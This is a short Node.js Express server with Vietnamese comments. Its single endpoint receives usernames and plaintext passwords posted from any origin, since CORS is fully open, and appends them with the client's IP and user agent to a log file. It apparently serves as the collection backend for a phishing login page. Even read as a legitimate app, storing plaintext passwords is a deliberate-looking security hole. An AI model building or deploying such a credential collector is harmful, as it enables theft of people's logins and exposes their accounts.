const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

const app = express();
app.use(express.json());
app.use(cors());

// Tạo thư mục logs nếu chưa có
const LOG_DIR = path.join(__dirname, "logs");
if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);

function appendLog(line) {
  const file = path.join(LOG_DIR, "logins.txt");
  fs.appendFileSync(file, line, { encoding: "utf8" });
}

app.get("/", (req, res) => {
  res.send("✅ Backend đang chạy!");
});

app.post("/log-login", (req, res) => {
  const { user, password, time, userAgent } = req.body;
  const ip =
    req.headers["x-forwarded-for"]?.toString().split(",")[0].trim() ||
    req.socket.remoteAddress;

  const line = `[${new Date().toISOString()}] user=${user} pass=${password} ip=${ip} ua="${userAgent}"\n`;

  try {
    appendLog(line);
    res.json({ ok: true });
  } catch (e) {
    console.error("❌ Lỗi ghi log:", e);
    res.status(500).json({ ok: false, error: "write_failed" });
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`🚀 Server chạy ở cổng ${PORT}`);
});
